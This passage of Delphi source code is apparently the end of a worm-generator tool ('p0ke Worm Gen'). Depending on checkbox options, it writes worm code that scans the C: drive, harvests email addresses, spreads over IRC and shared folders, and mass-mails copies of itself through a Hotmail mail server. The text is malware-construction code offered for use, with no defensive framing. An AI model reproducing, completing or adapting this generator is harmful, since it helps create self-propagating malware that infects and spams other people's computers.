  If (CheckBox2.Checked) Or (CheckBox3.Checked) Or (CheckBox4.Checked) Then Begin
   WriteLn( _Out , '  // Scan Mails, Infect Irc, Infect Sharings');
   WriteLn( _Out , '  ListFiles(''C:\'', ''*'', ''*.*'');');
  End;
  If CheckBox2.Checked Then Begin
   WriteLn( _Out , '  // Send Mails');
   WriteLn( _Out , '  While Mails <> '''' Do Begin');
   WriteLn( _Out , '   SendMail(Copy(Mails, 1, Pos(#13#10, mails)-1), '''+edit5.text+''', ''mx1.hotmail.com'');');
   WriteLn( _Out , '   Mails := Copy(Mails, Pos(#13#10, Mails)+ 2, length(Mails));');
   WriteLn( _Out , '  End;');
  End;
  WriteLn( _Out , ' Generated By p0ke Worm Gen. Remove this Line.');
  WriteLn( _Out , ' End.');
  CloseFile( _Out);
  MessageBox(0,'Done','Notice',mb_ok);

end;

end.
